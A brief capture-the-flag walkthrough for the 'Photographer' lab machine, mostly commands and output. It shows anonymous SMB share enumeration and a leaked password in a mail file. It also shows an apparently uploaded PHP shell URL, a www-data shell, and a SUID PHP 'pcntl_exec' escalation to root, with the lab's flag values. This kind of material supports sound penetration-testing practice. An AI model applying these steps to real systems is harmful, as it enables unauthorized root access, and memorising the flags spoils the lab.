参考教程：https://viperone.gitbook.io/pentest-everything/writeups/pg-play-or-vulnhub/linux/photographer
 
[https://medium.com/meetcyber/proving-grounds-photographer-walkthrough-4cf64a93c54a](https://medium.com/meetcyber/proving-grounds-photographer-walkthrough-4cf64a93c54a)
    
smbclient -L ////192.168.243.76//
 
smbclient -N ////192.168.243.76/sambashare
    
┌──(kali㉿kali)-[~/Desktop/pg02/Photographer]  
└─$ cat mailsent.txt  
Message-ID: \<4129F3CA.2020509@dc.edu\>  
Date: Mon, 20 Jul 2020 11:40:36 -0400  
From: Agi Clarence \<agi@photographer.com\>  
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0  
X-Accept-Language: en-us, en  
MIME-Version: 1.0  
To: Daisa Ahomi \<daisa@photographer.com\>  
Subject: To Do - Daisa Website's  
Content-Type: text/plain; charset=us-ascii; format=flowed  
Content-Transfer-Encoding: 7bit
 
Hi Daisa!  
Your site is ready now.  
Don't forget your secret, my babygirl ;)   ┌──(kali㉿kali)-[~/Desktop/pg02/Photographer]  
└─$
 
daisa@photographer.com  
babygirl
   

[http://192.168.243.76:8000/storage/originals/52/8e/1.php](http://192.168.243.76:8000/storage/originals/52/8e/1.php)
   

www-data@photographer:/home$ cd daisa  
cd daisa  
www-data@photographer:/home/daisa$ ls  
ls  
Desktop Downloads Pictures Templates examples.desktop user.txt  
Documents Music Public Videos local.txt  
www-data@photographer:/home/daisa$ cat local.txt  
cat local.txt  
4289ba9da1d4a904f412377efa288afa  
www-data@photographer:/home/daisa$
   

Documents Music Public Videos local.txt  
www-data@photographer:/home/daisa$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"  
\</daisa$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"  
# cd /root  
cd /root  
# ls  
ls  
proof.txt  
# cat proof.txt  
cat proof.txt  
543d2ea5713d4b822270aa185272f4c8  
#